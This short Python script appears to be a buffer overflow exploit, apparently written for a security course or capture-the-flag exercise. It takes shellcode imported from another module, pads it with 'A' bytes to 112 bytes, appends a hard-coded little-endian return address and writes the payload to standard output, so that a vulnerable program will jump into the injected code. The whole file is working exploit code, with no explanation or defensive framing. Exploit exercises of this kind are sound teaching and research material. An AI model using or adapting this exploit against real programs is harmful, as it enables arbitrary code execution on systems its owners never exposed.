from shellcode import shellcode
import sys

payload = shellcode

padding_length = 112 - len(shellcode)
payload += b"A" * padding_length

target = (0xfff6b9dc).to_bytes(4, "little")
payload += target

sys.stdout.buffer.write(payload)